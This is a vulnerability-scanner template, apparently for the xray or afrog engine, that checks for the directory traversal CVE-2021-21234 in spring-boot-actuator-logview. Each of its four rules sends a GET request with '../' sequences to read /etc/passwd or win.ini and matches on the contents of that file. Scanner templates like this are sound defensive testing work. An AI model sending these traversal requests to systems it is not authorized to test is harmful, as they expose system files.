id: CVE-2021-21234

info:
  name: Spring Boot Actuator Logview Directory Traversal
  author: gy741,pikpikcu
  severity: high
  description: |
    spring-boot-actuator-logview before version 0.2.13 contains a directory traversal vulnerability in libraries that adds a simple logfile viewer as a spring boot actuator endpoint (maven package "eu.hinsch:spring-boot-actuator-logview".

  reference:
  - https://blogg.pwc.no/styringogkontroll/unauthenticated-directory-traversal-vulnerability-in-a-java-spring-boot-actuator-library-cve-2021-21234
  - https://github.com/cristianeph/vulnerability-actuator-log-viewer
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21234

rules:
  r0:
    request:
      method: GET
      path: /manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
    expresssion: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /log/view?filename=/etc/passwd&base=../../../../../../../../../../
    expresssion: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r2:
    request:
      method: GET
      path: /manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
    expresssion: response.status == 200 &&  response.body.bcontains(b"bit app support") &&  response.body.bcontains(b"extensions") &&  response.body.bcontains(b"fonts")
  r3:
    request:
      method: GET
      path: /log/view?filename=/windows/win.ini&base=../../../../../../../../../../
    expresssion: response.status == 200 &&  response.body.bcontains(b"bit app support") &&  response.body.bcontains(b"extensions") &&  response.body.bcontains(b"fonts")
expression: r0() || r1() || r2() || r3()